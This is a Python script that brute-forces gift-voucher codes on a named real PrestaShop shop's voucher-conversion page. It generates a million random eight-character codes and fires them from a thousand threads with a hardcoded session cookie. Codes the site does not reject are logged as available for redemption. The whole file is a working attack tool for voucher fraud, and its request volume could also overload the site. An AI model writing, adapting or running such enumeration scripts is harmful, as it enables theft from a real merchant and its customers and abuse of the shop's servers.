import requests
from time import sleep
import random
import html2text
import datetime
import threading
import string

REQUESTS_PER_THREAD = 1000
MAX_THREADS = 1000

already_checked_codes = []
with open('not_available_codes.txt', "r") as file:
    for line in file:
        already_checked_codes.append(line.strip()[-8:])

codes = []
for i in range(MAX_THREADS * REQUESTS_PER_THREAD):
    while True:
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        if code not in already_checked_codes:
            codes.append(code)
            break


def code_request(start):
    for i in range(start * REQUESTS_PER_THREAD, (start + 1) * REQUESTS_PER_THREAD):
        html = ""
        while True:
            cookies = {
                'PrestaShop-f703778a26c641639903ac98fd60fdf6': '0c8d2238410f4695826485afd656f4af4094608109128d5c713f08a404f3e2cf%3AtOxNIOVZ3kpJfDF8luDBVf8JFMvlvAw7xSIUYZ4jYkfpIvzh3wEPxMyALOWXEilJMeqNqw9%2BQ2MaH2bL22hrERCFc1nD2sLQ6VaVjdn%2B%2BlxDY8aeGLFy9mpAx%2B3ETMzQlzN%2F7rQITn5phEtetNYs0p5Jub1iWQaAQzcGW2JFTvmvWGGfG2lqswW5bEBHygcBccrQmUJnmcqQ9UMTEz5HVAK0qgO1Fs0tPrhZPou5AZz9zZe0C1%2BaTc4Y2vctIM53vytYPNodMxleh2Tgw%2Fb%2BILy7TpaqMDsNDLnPjkIQFfdIb%2BUoUweB9sXiGpIrlti86mwGzLThMYHm4FGU3MNO4Xga4dVJPUAltXrCBiIoe%2BErYNi9cgB72aJc1QkoIW%2BULye0OurIEvSLerxrbsUqhExlRH5gZSQi0VpRP5Aa7zPcvPpzPcIaL6UTKXnAwmsWufBv35%2FN5j7pfgwDgen5k4h6SME1KezqzgY4srAXzKp3iDZjFWobLcvElomNHraA3YoVWFnsuVHHY8YyzhkTNQsKyQCCtqn1ZoupDrFiBEigLt71L6hqpBqkmcU5qFlO',
                'zeropopupnewsletter': '1',
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.promoweb.biz',
                'Connection': 'keep-alive',
                'Referer': 'https://www.promoweb.biz/shop/index.php?fc=module&module=art18applite&controller=convertibuoni',
                'Upgrade-Insecure-Requests': '1',
                'TE': 'Trailers',
            }

            params = (
                ('fc', 'module'),
                ('module', 'art18applite'),
                ('controller', 'convertibuoni'),
            )

            data = {
                'voucher': codes[i]
            }

            try:
                response = requests.post('https://www.promoweb.biz/shop/index.php', headers=headers, params=params,
                                     cookies=cookies, data=data)
                if response.status_code == 200:
                    html = html2text.html2text(response.text)
                    break
            except requests.exceptions.ConnectionError:
                sleep(500)

        if "Errore: 02: Il buono richiesto non è disponibile sul sistema o è già stato\nriscosso o annullato" not in html:
            with open("available_codes.txt", "a") as file:
                file.writelines(f'{datetime.datetime.now()}: {codes[i]}\n')
                print(f'{datetime.datetime.now()}: {codes[i]} => AVAILABLE')
        else:
            with open("not_available_codes.txt", "a") as file:
                file.writelines(f'{datetime.datetime.now()}: {codes[i]}\n')
                print(f'{datetime.datetime.now()}: {codes[i]} => NOT AVAILABLE')


threads = [threading.Thread(target=code_request, args=(i,), daemon=True) for i in range(MAX_THREADS)]

for i in range(MAX_THREADS):
    threads[i].start()

for i in range(MAX_THREADS):
    threads[i].join()
